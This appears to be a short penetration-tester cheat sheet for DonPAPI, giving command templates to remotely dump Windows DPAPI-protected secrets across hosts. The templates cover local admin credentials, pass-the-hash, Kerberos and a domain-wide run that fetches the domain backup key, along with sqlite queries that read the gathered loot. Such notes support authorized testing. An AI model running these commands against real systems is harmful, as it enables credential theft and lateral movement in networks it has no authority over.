# DonPAPI

% DonPAPI, dpapi

#plateform/linux  #target/remote  #cat/CREDENTIAL-ACCESS/DPAPI

## list gathered
```bash
sqlite3  -readonly donpapi.db -cmd '.tables' ".exit"
```

## count gathered
```bash
sqlite3  -readonly donpapi.db -cmd 'select count(1) from <table>;' ".exit"
```

## show gathered
```bash
sqlite3  -readonly donpapi.db -cmd 'select * from <table>;' ".exit"
```

## Dump all secrets (localadmin creds)
```
DonPAPI <target>/<user>:<password>@<target>
```

## DonPAPI - Dump all secrets (localadmin pth)
```
DonPAPI  collect -u <user> --hashes :<NT> -t <target>
```

## Dump all secrets (kerberos)
```
DonPAPI -k <domain_fqdn>/<user>@<target>
```


## DonPAPI - Dump all secrets with Domain Admin and PVK (pth)
run dpapi.py to get PVK
```
DonPAPI  collect -d <domain_fqdn>  -u administrator --hashes :<nt_hash> --dc-ip <dc_ip> -t ALL --fetch-pvk 
```